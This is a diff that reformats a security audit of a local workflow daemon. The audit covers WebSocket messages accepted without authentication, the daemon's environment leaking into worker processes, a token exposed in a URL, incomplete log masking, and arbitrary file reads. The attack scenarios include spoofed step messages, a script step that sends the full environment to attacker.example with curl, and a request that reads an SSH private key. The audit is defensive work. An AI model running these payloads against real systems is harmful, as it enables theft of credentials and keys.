@@ -15,9 +15,16 @@ Audited: Secret.ts, SecretProvider.ts, LogMasker.ts, CommandHandler.ts, McpServe
 The WebSocket server binds to `127.0.0.1` but accepts any connection without authentication (noted in the v1 comment at line 9). All message types — `inject_steps`, `step_completed`, `step_failed`, `log` — are processed without verifying the sender is a legitimate worker. Only the `ready` message triggers a PID check (WorkerPool.ts:74), and that check relies on a self-reported field (see S2).
 
 **Attack scenario:** An attacker process on the same machine connects to the daemon WebSocket port. It sends:
+
 ```json
-{"type":"step_completed","executionId":"<known-id>","stepId":"<step>","output":{"result":"attacker-controlled"}}
+{
+	"type": "step_completed",
+	"executionId": "<known-id>",
+	"stepId": "<step>",
+	"output": { "result": "attacker-controlled" }
+}
 ```
+
 The daemon marks the step completed with poisoned output. Downstream steps that consume `{{steps.<step>.result}}` receive the attacker-controlled value — model prompts are injected, script env vars are set from attacker data, file paths are poisoned. The entire execution completes silently with corrupted state.
 
 The attacker can also send `step_failed` to kill any running execution, or `inject_steps` to add arbitrary model/script steps to any active execution, bypassing the flow validator entirely.
@@ -53,12 +60,14 @@ Combined with S1, the attacker can register as a worker AND send arbitrary step 
 `env: { ...process.env, FLOW_DAEMON_PORT: ..., FLOW_WS_PORT: ... }` spreads the entire daemon environment into every worker subprocess. The daemon's environment may include API keys, database credentials, SSH keys, or cloud provider tokens present in the user's shell at daemon startup time.
 
 **Attack scenario:** A flow YAML containing a `script` step can exfiltrate the full environment:
+
 ```yaml
 steps:
-  - id: exfil
-    type: script
-    script: "curl https://attacker.example/collect -d \"$(env | base64)\""
+    - id: exfil
+      type: script
+      script: 'curl https://attacker.example/collect -d "$(env | base64)"'
 ```
+
 If the daemon was started in a shell that had `AWS_SECRET_ACCESS_KEY`, `ANTHROPIC_API_KEY`, or any other credential set, the script step receives and exfiltrates them. The user running the flow need not be the attacker — a flow YAML fetched from an untrusted source, or injected via S1, produces the same outcome.
 
 **Fix:** Spawn workers with an explicit minimal environment: only `PATH`, `HOME`, `TMPDIR`/`TEMP`, and the flow-specific vars (`FLOW_DAEMON_PORT`, `FLOW_WS_PORT`). If specific env vars need to propagate (e.g., for system tools), use an explicit allowlist in the daemon config rather than a wildcard spread.
@@ -72,9 +81,11 @@ If the daemon was started in a shell that had `AWS_SECRET_ACCESS_KEY`, `ANTHROPI
 **Vulnerability type:** Token leakage in URL
 
 The MCP config embeds the bearer token directly in the URL query string:
+
 ```json
-{"url": "http://127.0.0.1:<port>/mcp?token=<uuid>"}
+{ "url": "http://127.0.0.1:<port>/mcp?token=<uuid>" }
 ```
+
 URL query parameters appear in: (1) web server and proxy access logs, (2) error messages from ClaudeLauncher or any HTTP middleware, (3) `ps aux` / `wmic` output if the URL is passed as a CLI argument by the MCP client, (4) shell history if the URL is printed and copy-pasted.
 
 **Attack scenario:** If the system has a web proxy or any request-logging middleware (common in corporate environments), the full URL including the token is logged. An attacker with access to those logs can replay the token against the still-running MCP HTTP server during the lifetime of the step execution and inject arbitrary steps via `provideSteps`.
@@ -90,6 +101,7 @@ URL query parameters appear in: (1) web server and proxy access logs, (2) error 
 **Vulnerability type:** Incomplete secret masking — short secrets logged in plaintext
 
 `if (variant.length < 4) continue` skips any encoding variant shorter than 4 bytes. For a 1, 2, or 3-character plaintext secret:
+
 - A 3-char secret `abc` has plaintext `variant.length === 3` → the plaintext variant is skipped and never masked.
 - The base64 no-pad variant of a 2-byte secret is 2 characters → skipped.
 - The hex variant of a 1-byte secret is 2 characters → skipped.
@@ -109,9 +121,11 @@ URL query parameters appear in: (1) web server and proxy access logs, (2) error 
 The daemon accepts a `flowFile` path from any client IPC command and reads it with `fs.readFileSync(flowFile, 'utf8')` without any restriction to a project directory or workspace boundary. YAML parse errors include fragments of the file content via `String(err)` (line 52), which propagates back to the client response.
 
 **Attack scenario:** Any process with access to the daemon client channel can send:
+
 ```json
-{"type":"run","flowFile":"/home/victim/.ssh/id_rsa","cwd":"/tmp"}
+{ "type": "run", "flowFile": "/home/victim/.ssh/id_rsa", "cwd": "/tmp" }
 ```
+
 The daemon reads the file and returns a PARSE_ERROR whose `message` contains content from the SSH key (yaml.load error messages include the offending line/bytes). Even without error disclosure, the daemon can be used to verify file existence for any path the daemon process can access.
 
 If combined with S1 (no WebSocket auth for workers), an attacker who can inject a `step_completed` message with a known executionId can also manipulate which file paths are used in subsequent steps.
